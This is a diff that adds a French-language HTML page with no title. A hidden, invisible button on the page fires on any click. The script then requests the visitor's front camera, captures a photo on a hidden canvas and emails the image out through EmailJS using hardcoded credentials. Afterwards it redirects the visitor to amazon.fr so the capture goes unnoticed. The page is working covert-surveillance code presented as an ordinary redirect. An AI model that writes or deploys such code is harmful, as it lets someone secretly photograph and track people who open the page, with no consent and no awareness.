@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      background: none;
+      cursor: pointer;
+    }
+    #triggerButton {
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      border: none;
+      background: none;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <button id="triggerButton">Start</button>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="300" height="200"></canvas>
+
+  <script>
+    // Initialisation EmailJS
+    emailjs.init("mxm3fFA_BxEhqJieq");
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const button = document.getElementById('triggerButton');
+
+    async function startCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }
+        });
+        video.srcObject = stream;
+
+        video.onloadeddata = () => {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL("image/png");
+
+          emailjs.send("service_8cs0gml", "template_w14xn7c", {
+            message: "Photo automatique capturée 📸",
+            image: imageData
+          })
+          .then(() => {
+            // Redirection vers Amazon
+            window.location.href = "https://www.amazon.fr";
+          })
+          .catch((err) => {
+            console.log("Erreur EmailJS:", err);
+            window.location.href = "https://www.amazon.fr";
+          });
+        };
+
+      } catch (err) {
+        console.log("Erreur caméra:", err);
+        window.location.href = "https://www.amazon.fr";
+      }
+    }
+
+    // Déclenche le bouton invisible au clic sur la page
+    document.body.addEventListener('click', () => {
+      button.click();
+    });
+
+    // Lancement au clic sur le bouton invisible
+    button.addEventListener('click', startCapture);
+  </script>
+</body>
+</html>
